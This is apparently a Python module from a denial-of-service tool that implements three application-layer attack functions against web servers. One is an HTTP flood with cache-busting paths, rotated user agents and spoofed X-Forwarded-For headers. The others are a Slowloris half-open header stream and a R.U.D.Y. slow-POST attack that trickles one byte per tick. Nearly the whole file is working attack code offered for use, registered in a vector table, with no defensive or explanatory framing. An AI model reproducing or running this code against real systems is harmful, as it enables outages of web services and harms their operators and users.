"""Layer-7 vectors. Unprivileged, one connection per iteration."""
from __future__ import annotations

import os
import random
import socket
import ssl
import time

from ..context import Ctx

_TLS: ssl.SSLContext | None = None


def _tls() -> ssl.SSLContext:
    global _TLS
    if _TLS is None:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_ciphers("DEFAULT@SECLEVEL=1")
        _TLS = ctx
    return _TLS


def _connect(c: Ctx) -> socket.socket:
    s = socket.socket()
    s.settimeout(4)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.connect((c.dst, c.dport))
    if c.ssl:
        s = _tls().wrap_socket(s, server_hostname=c.target_host)
    return s


def _request(c: Ctx) -> bytes:
    path = c.path
    path += ("&" if "?" in path else "?") + f"{random.getrandbits(48):x}"
    host = c.target_host
    hdr = [
        f"{c.method} {path} HTTP/1.1",
        f"Host: {host}",
        f"User-Agent: {random.choice(c.uas)}",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language: en-US,en;q=0.9",
        "Accept-Encoding: gzip, deflate, br",
        "Cache-Control: no-cache",
        "Pragma: no-cache",
        "Upgrade-Insecure-Requests: 1",
        f"X-Forwarded-For: {random.getrandbits(8)}.{random.getrandbits(8)}."
        f"{random.getrandbits(8)}.{random.getrandbits(8)}",
        f"Referer: http{'s' if c.ssl else ''}://{host}/",
        f"Connection: {'keep-alive' if c.keepalive else 'close'}",
    ]
    body = b""
    if c.method == "POST":
        body = os.urandom(random.randint(64, 1024))
        hdr += ["Content-Type: application/x-www-form-urlencoded",
                f"Content-Length: {len(body)}"]
    return ("\r\n".join(hdr) + "\r\n\r\n").encode() + body


def http(c: Ctx) -> None:
    s = _connect(c)
    try:
        s.sendall(_request(c))
        try:
            s.recv(2048)
        except (socket.timeout, OSError):
            pass
    finally:
        s.close()


def slowloris(c: Ctx) -> None:
    """Half-open header stream, one dummy header per tick."""
    s = socket.socket()
    s.settimeout(6)
    try:
        s.connect((c.dst, c.dport))
        s.sendall(f"GET {c.path} HTTP/1.1\r\nHost: {c.target_host}\r\n".encode())
        for _ in range(random.randint(400, 1200)):
            s.sendall(f"X-{random.getrandbits(24):x}: {os.urandom(8).hex()}\r\n".encode())
            time.sleep(0.8)
        s.sendall(b"\r\n")
    finally:
        s.close()


def rudy(c: Ctx) -> None:
    """Announce a huge body, then trickle one byte per tick."""
    s = socket.socket()
    s.settimeout(6)
    try:
        s.connect((c.dst, c.dport))
        s.sendall((f"POST {c.path} HTTP/1.1\r\nHost: {c.target_host}\r\n"
                   "Content-Type: application/x-www-form-urlencoded\r\n"
                   "Content-Length: 1000000\r\nConnection: keep-alive\r\n\r\n").encode())
        for _ in range(random.randint(300, 900)):
            s.sendall(b"a")
            time.sleep(0.7)
    finally:
        s.close()


VECTORS = {"http": http, "slowloris": slowloris, "rudy": rudy}
